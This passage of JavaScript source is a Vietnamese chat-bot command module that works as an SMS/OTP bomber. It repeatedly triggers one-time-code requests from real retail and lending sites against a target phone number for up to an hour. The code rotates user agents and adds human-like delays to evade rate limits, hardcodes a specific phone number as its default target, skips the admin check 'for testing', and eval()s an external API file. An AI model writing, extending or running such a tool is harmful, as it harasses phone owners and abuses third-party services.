                        'Cache-Control': 'no-cache'
                    },
                    timeout: 10000
                });
                
                console.log(`[SPAM-FPTSHOP] Response status: ${response.status}`);
                return {
                    success: response.status === 200,
                    api: 'fptshop',
                    userAgent: userAgent
                };
            } catch (error) {
                console.log('[SPAM-FPTSHOP] Error:', error.message);
                return {
                    success: false,
                    api: 'fptshop',
                    error: error.message
                };
            }
        });
        
        // TGDD API
        this.apis.push(async function tgdd(phone) {
            try {
                const userAgent = getRandomUserAgent();
                console.log(`[SPAM-TGDD] Sending request for phone ${phone.substring(2)}`);
                
                const response = await axios.post('https://tgdd.vn/game/otp',
                    { "fcCode": phone.substring(2) }, // Remove country code
                    {
                        headers: {
                            'User-Agent': userAgent,
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        timeout: 10000
                    }
                );
                
                console.log(`[SPAM-TGDD] Response status: ${response.status}`);
                return {
                    success: response.status === 200,
                    api: 'tgdd',
                    userAgent: userAgent
                };
            } catch (error) {
                console.log('[SPAM-TGDD] Error:', error.message);
                return {
                    success: false,
                    api: 'tgdd',
                    error: error.message
                };
            }
        });
        
        // Robocash API
        this.apis.push(async function robocash(phone) {
            try {
                const userAgent = getRandomUserAgent();
                console.log(`[SPAM-ROBOCASH] Sending request for phone ${phone.substring(2)}`);
                
                const response = await axios.post('https://robocash.vn/register/phone-resend',
                    `phone=${phone.substring(2)}`, // Remove country code
                    {
                        headers: {
                            'User-Agent': userAgent,
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        timeout: 10000
                    }
                );
                
                console.log(`[SPAM-ROBOCASH] Response status: ${response.status}`);
                return {
                    success: response.status === 200,
                    api: 'robocash',
                    userAgent: userAgent
                };
            } catch (error) {
                console.log('[SPAM-ROBOCASH] Error:', error.message);
                return {
                    success: false,
                    api: 'robocash',
                    error: error.message
                };
            }
        });
        
        try {
            // Load additional APIs from the auto-generated file
            const fs = require('fs');
            const path = require('path');
            const apiPath = path.join(__dirname, 'assets/apis_output.js');
            
            if (fs.existsSync(apiPath)) {
                console.log('[SPAM] Loading additional APIs from apis_output.js');
                // Read and evaluate the code
                const additionalAPIs = fs.readFileSync(apiPath, 'utf8');
                // Execute the APIs in the context of this object
                const initContext = function() {
                    // Execute in this context
                    eval(additionalAPIs);
                };
                initContext.call(this);
                
                // Initialize API scoring system if it exists
                if (typeof initApiScoring === 'function') {
                    initApiScoring();
                    console.log('[SPAM] API scoring system initialized');
                    
                    // Replace default getRandomAPI with smart API selection
                    if (typeof getWeightedRandomApi === 'function') {
                        this.getRandomAPI = function() {
                            return getWeightedRandomApi();
                        };
                        console.log('[SPAM] Using smart API selection for better success rates');
                    }
                }
            } else {
                // Create the assets directory if it doesn't exist
                const assetsDir = path.join(__dirname, 'assets');
                if (!fs.existsSync(assetsDir)) {
                    fs.mkdirSync(assetsDir, { recursive: true });
                }
                
                // Placeholder for getRandomAPI
                this.getRandomAPI = function() {
                    const randomIndex = Math.floor(Math.random() * this.apis.length);
                    const functionStr = this.apis[randomIndex].toString();
                    const apiName = functionStr.substring(
                        functionStr.indexOf("async") + 6, 
                        functionStr.indexOf("(")
                    ).trim() || `API ${randomIndex}`;
                    
                    return {
                        api: this.apis[randomIndex],
                        apiName,
                        index: randomIndex
                    };
                };
            }
        } catch (error) {
            console.error('[SPAM] Error loading additional APIs:', error.message);
        }
        
        // After adding all APIs, log the total count
    },
    
    // Default method to get a random API
    getRandomAPI() {
        // This will be overridden if enhanced API selection is available
        const randomIndex = Math.floor(Math.random() * this.apis.length);
        const functionStr = this.apis[randomIndex].toString();
        const apiName = functionStr.substring(
            functionStr.indexOf("async") + 6, 
            functionStr.indexOf("(")
        ).trim() || `API ${randomIndex}`;
        
        return {
            api: this.apis[randomIndex],
            apiName,
            index: randomIndex
        };
    }
};

// Initialize APIs
smsApis.init();

module.exports.run = async function({ api, event, args, Users, Threads }) {
    const { threadID, senderID, messageID } = event;
    
    // Debug log
    console.log(`[SPAM] Command execution started by ${senderID} with args:`, args);
    
    // For testing with the provided phone number
    if (!args || args.length === 0) {
        args = ['0786888655', '20']; // Test with user's requested number
        console.log(`[SPAM] No arguments provided, using test phone: ${args[0]} for ${args[1]} seconds`);
    }
    
    // Check if user has admin permissions (bypass for testing)
    try {
        if (global.config && global.config.ADMINBOT && !global.config.ADMINBOT.includes(senderID)) {
            console.log(`[SPAM] Permission denied for user ${senderID}`);
            return api.sendMessage("‚ö†Ô∏è B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!", threadID, messageID);
        }
    } catch (e) {
        console.log("[SPAM] Error checking admin permissions:", e.message);
        // Continue anyway for testing
    }
    
    // Show API list
    if (args[0] && args[0].toLowerCase() === 'apis') {
        console.log(`[SPAM] Displaying API list, total: ${smsApis.apis.length}`);
        let apiList = "üìã Danh s√°ch API spam SMS hi·ªán c√≥:\n\n";
        
        smsApis.apis.forEach((api, index) => {
            // Extract API name from function name
            const functionStr = api.toString();
            const apiName = functionStr.substring(
                functionStr.indexOf("async") + 6, 
                functionStr.indexOf("(")
            ).trim() || `API ${index + 1}`;
            
            apiList += `${index + 1}. ${apiName}\n`;
        });
        
        apiList += `\n‚úÖ T·ªïng c·ªông: ${smsApis.apis.length} API`;
        return api.sendMessage(apiList, threadID, messageID);
    }
    
    // SMS spam mode (default)
    if (args.length < 2) {
        console.log("[SPAM] Insufficient arguments provided");
        return api.sendMessage("‚ö†Ô∏è S·ª≠ d·ª•ng: spam [s·ªë ƒëi·ªán tho·∫°i] [th·ªùi gian ch·∫°y (gi√¢y)]\nV√≠ d·ª•: spam 0912345678 60", threadID, messageID);
    }
    
    let phone = args[0];
    const runTimeSeconds = parseInt(args[1]);
    
    console.log(`[SPAM] Starting spam to phone: ${phone} for ${runTimeSeconds} seconds`);
    
    // Validate phone number format (Vietnamese format)
    if (!/^0\d{9}$/.test(phone)) {
        console.log(`[SPAM] Invalid phone number format: ${phone}`);
        return api.sendMessage("‚ö†Ô∏è S·ªë ƒëi·ªán tho·∫°i kh√¥ng h·ª£p l·ªá! Ph·∫£i c√≥ ƒë·ªãnh d·∫°ng 10 s·ªë b·∫Øt ƒë·∫ßu b·∫±ng s·ªë 0.", threadID, messageID);
    }
    
    // Validate run time
    if (isNaN(runTimeSeconds) || runTimeSeconds <= 0) {
        console.log(`[SPAM] Invalid runtime: ${runTimeSeconds}`);
        return api.sendMessage("‚ö†Ô∏è Th·ªùi gian ch·∫°y ph·∫£i l√† s·ªë d∆∞∆°ng!", threadID, messageID);
    }
    
    // Set maximum run time to prevent abuse
    const maxAllowedRunTime = 3600; // 1 hour max
    if (runTimeSeconds > maxAllowedRunTime) {
        console.log(`[SPAM] Runtime exceeds maximum allowed: ${runTimeSeconds} > ${maxAllowedRunTime}`);
        return api.sendMessage(`‚ö†Ô∏è Th·ªùi gian ch·∫°y t·ªëi ƒëa l√† ${maxAllowedRunTime} gi√¢y (1 gi·ªù)!`, threadID, messageID);
    }
    
    // Send confirmation
    await api.sendMessage(`üîÑ ƒêang chu·∫©n b·ªã spam SMS ƒë·∫øn s·ªë ƒëi·ªán tho·∫°i ${phone} trong ${runTimeSeconds} gi√¢y...`, threadID, messageID);
    
    // Execute continuous SMS spam for the specified time
    try {
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        
        let successCount = 0;
        let failCount = 0;
        let logs = "";
        let lastUpdateTime = Date.now();
        let apiStats = {}; // Track success/failure by API
        
        // Make sure phone number format is correct (remove leading 0, add country code)
        // This converts format from 0987654321 to 84987654321
        let originalPhone = phone;
        if (phone.startsWith('0')) {
            phone = '84' + phone.substring(1);
            console.log(`[SPAM] Converted phone number from ${originalPhone} to ${phone}`);
        }
        
        // Calculate end time
        const startTime = Date.now();
        const endTime = startTime + (runTimeSeconds * 1000);
        
        console.log(`[SPAM] Campaign started at ${new Date(startTime).toISOString()}, will end at ${new Date(endTime).toISOString()}`);
        console.log(`[SPAM] Total APIs available: ${smsApis.apis.length}`);
        
        // Send status updates every few seconds
        const sendStatusUpdate = async () => {
            if (Date.now() - lastUpdateTime >= 5000) { // Update every 5 seconds
                const message = `üìä Ti·∫øn ƒë·ªô: ${Math.floor((Date.now() - startTime) / 1000)}/${runTimeSeconds} gi√¢y\n‚úÖ Th√†nh c√¥ng: ${successCount}\n‚ùå Th·∫•t b·∫°i: ${failCount}`;
                console.log(`[SPAM] Status update: ${message}`);
                await api.sendMessage(message, threadID);
                lastUpdateTime = Date.now();
            }
        };
        
        // Run until the time is up
        while (Date.now() < endTime) {
            try {
                // Check if humanDelay function exists (from enhanced module) and use it
                if (typeof humanDelay === 'function') {
                    await humanDelay();
                }
                
                // Use the enhanced API selection if available, otherwise use random selection
                let apiInfo;
                if (typeof smsApis.getRandomAPI === 'function') {
                    apiInfo = smsApis.getRandomAPI();
                } else {
                    // Fallback to default random selection
                    const randomApiIndex = Math.floor(Math.random() * smsApis.apis.length);
                    const randomApi = smsApis.apis[randomApiIndex];
                    
                    // Extract API name for logging
                    const functionStr = randomApi.toString();
                    const apiName = functionStr.substring(
                        functionStr.indexOf("async") + 6, 
                        functionStr.indexOf("(")
                    ).trim() || `API ${randomApiIndex}`;
                    
                    apiInfo = {
                        api: randomApi,
                        apiName,
                        index: randomApiIndex
                    };
                }
                
                const { api: randomApi, apiName } = apiInfo;
                
                console.log(`[SPAM] Trying API: ${apiName} for phone ${phone}`);
                
                // Initialize stats for this API if not exists
                if (!apiStats[apiName]) {
                    apiStats[apiName] = { success: 0, fail: 0 };
                }
                
                // Get random headers for better bypass if available
                let customHeaders = null;
                if (typeof getRandomHeaders === 'function') {
                    customHeaders = getRandomHeaders();
                }
                
                // Call the API with the phone number
                const result = await randomApi(phone);
                
                // Update API scoring system if it exists
                if (typeof updateApiScore === 'function') {
                    updateApiScore(apiName, result && result.success);
                }
                
                if (result && result.success) {
                    successCount++;
                    apiStats[apiName].success++;
                    const logMsg = `‚úÖ G·ª≠i th√†nh c√¥ng qua API ${result.api || apiName}`;
                    logs += logMsg + '\n';
                    console.log(`[SPAM] ${logMsg}`);
                } else {
                    failCount++;
                    apiStats[apiName].fail++;
                    const logMsg = `‚ùå G·ª≠i th·∫•t b·∫°i qua API ${result ? (result.api || apiName) : apiName}: ${result ? result.error : 'Unknown error'}`;
                    logs += logMsg + '\n';
                    console.log(`[SPAM] ${logMsg}`);
                }
                
                // Send status update
                await sendStatusUpdate();
                
                // Add delay between API calls (random between 1-3 seconds)
                const apiDelay = Math.floor(Math.random() * 2000) + 1000;
                console.log(`[SPAM] Waiting ${apiDelay}ms before next API call`);
                await delay(apiDelay);
                
                // If logs get too long, trim them
                if (logs.length > 5000) {
                    logs = "...(ƒê√£ b·ªè qua log c≈©)...\n" + logs.substring(logs.length - 3000);
                }
                
            } catch (err) {
                failCount++;
                const logMsg = `‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh: ${err.message}`;
                logs += logMsg + '\n';
                console.log(`[SPAM] Error executing API:`, err);
                await delay(1000); // Delay on error
            }
        }
        
        // Generate API statistics
        let apiStatsText = "\n\nüìä Th·ªëng k√™ theo API:\n";
        Object.keys(apiStats).forEach(api => {
            const stats = apiStats[api];
            apiStatsText += `- ${api}: ‚úÖ ${stats.success} | ‚ùå ${stats.fail}\n`;
        });
        
        // Send final logs (limited to avoid message too long)
        const truncatedLogs = logs.length > 2000 ? logs.substring(logs.length - 2000) + " (Ch·ªâ hi·ªÉn th·ªã log g·∫ßn ƒë√¢y)" : logs;
        
        // Calculate runtime
        const actualRuntime = Math.floor((Date.now() - startTime) / 1000);
        
        const finalMessage = `‚úÖ Ho√†n th√†nh chi·∫øn d·ªãch spam SMS!\n‚è±Ô∏è Th·ªùi gian ch·∫°y: ${actualRuntime} gi√¢y\nüìä Th·ªëng k√™:\n- T·ªïng s·ªë l·∫ßn g·ªçi API: ${successCount + failCount}\n- Th√†nh c√¥ng: ${successCount}\n- Th·∫•t b·∫°i: ${failCount}${apiStatsText}\n\nüìù Logs g·∫ßn ƒë√¢y:\n${truncatedLogs}`;
        
        console.log(`[SPAM] Campaign completed. Success: ${successCount}, Failed: ${failCount}, Total: ${successCount + failCount}`);
        console.log("[SPAM] API Stats:", apiStats);
        
        // Notify completion
        return api.sendMessage(finalMessage, threadID);
        
    } catch (error) {
        console.error("[SPAM] Fatal error during execution:", error);
        return api.sendMessage(`‚ùå L·ªói trong qu√° tr√¨nh spam SMS: ${error.message}`, threadID, messageID);
    }
};

module.exports.handleEvent = function({ api, event, client, Users }) {
    // This function handles events outside of direct commands if needed
    // For the spam module, we probably don't need additional event handling
    return;
};

module.exports.languages = {
    "vi": {
        "permissionError": "‚ö†Ô∏è B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
        "invalidSyntax": "‚ö†Ô∏è C√∫ ph√°p kh√¥ng h·ª£p l·ªá! S·ª≠ d·ª•ng: spam [mode] [phone/uid] [s·ªë l∆∞·ª£ng] [delay]",
        "invalidPhone": "‚ö†Ô∏è S·ªë ƒëi·ªán tho·∫°i kh√¥ng h·ª£p l·ªá! Ph·∫£i c√≥ ƒë·ªãnh d·∫°ng 10 s·ªë b·∫Øt ƒë·∫ßu b·∫±ng s·ªë 0.",
        "invalidCount": "‚ö†Ô∏è S·ªë l∆∞·ª£ng spam ph·∫£i l√† m·ªôt s·ªë d∆∞∆°ng!",
        "maxCount": "‚ö†Ô∏è S·ªë l∆∞·ª£ng spam t·ªëi ƒëa l√† %1!",
        "invalidDelay": "‚ö†Ô∏è Th·ªùi gian delay ph·∫£i l√† s·ªë d∆∞∆°ng!",
        "spamming": "üîÑ ƒêang spam %1 tin nh·∫Øn ƒë·∫øn %2...",
        "spamSuccess": "‚úÖ ƒê√£ g·ª≠i th√†nh c√¥ng %1/%2 tin nh·∫Øn.",
        "spamError": "‚ùå L·ªói trong qu√° tr√¨nh spam: %1",
        "targetNotFound": "‚ö†Ô∏è Kh√¥ng t√¨m th·∫•y ng∆∞·ªùi d√πng/nh√≥m v·ªõi ID %1!",
        "verifyError": "‚ö†Ô∏è L·ªói x√°c minh m·ª•c ti√™u: %1",
        "emptyMessage": "‚ö†Ô∏è Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ spam!"
    },
    "en": {
        "permissionError": "‚ö†Ô∏è You don't have permission to use this command!",
        "invalidSyntax": "‚ö†Ô∏è Invalid syntax! Use: spam [mode] [phone/uid] [number] [delay]",
        "invalidPhone": "‚ö†Ô∏è Invalid phone number! Must be in 10-digit format starting with 0.",
        "invalidCount": "‚ö†Ô∏è Spam count must be a positive number!",
        "maxCount": "‚ö†Ô∏è Maximum spam count is %1!",
        "invalidDelay": "‚ö†Ô∏è Delay time must be a positive number!",
        "spamming": "üîÑ Spamming %1 messages to %2...",
        "spamSuccess": "‚úÖ Successfully sent %1/%2 messages.",
        "spamError": "‚ùå Error during spam process: %1",
        "targetNotFound": "‚ö†Ô∏è User/Thread with ID %1 not found!",
        "verifyError": "‚ö†Ô∏è Error verifying target: %1",
        "emptyMessage": "‚ö†Ô∏è Please provide a message to spam!"
    }
};

// Export the ensureModuleExists function for testing
module.exports.ensureModuleExists = ensureModuleExists;